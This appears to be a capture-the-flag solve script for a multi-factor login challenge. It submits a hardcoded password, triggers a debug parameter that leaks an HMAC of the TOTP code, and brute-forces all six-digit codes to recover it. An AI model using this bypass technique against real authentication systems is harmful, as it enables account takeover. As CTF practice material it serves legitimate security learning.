import requests

url = "https://multifactorial.csd.lol"
s = requests.Session()

# stage 1
res = s.post(f'{url}/api/something-you-know-check', json={ 'password': "northpole123" })

# stage 2
import hashlib, hmac

def recover_totp(target_hmac, secret):
    for i in range(1000000):
        totp = f"{i:06d}".encode()

        digest = hmac.new(secret.encode(), totp, hashlib.sha256).hexdigest()

        if digest == target_hmac:
            return totp.decode()

    return None

res = s.post(f"{url}/api/something-you-have-verify?debug=1", json={ "code": '000000' })

hmac_data = res.json()['hmac']
secret = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"

totp = recover_totp(hmac_data, secret)
print("TOTP:", totp)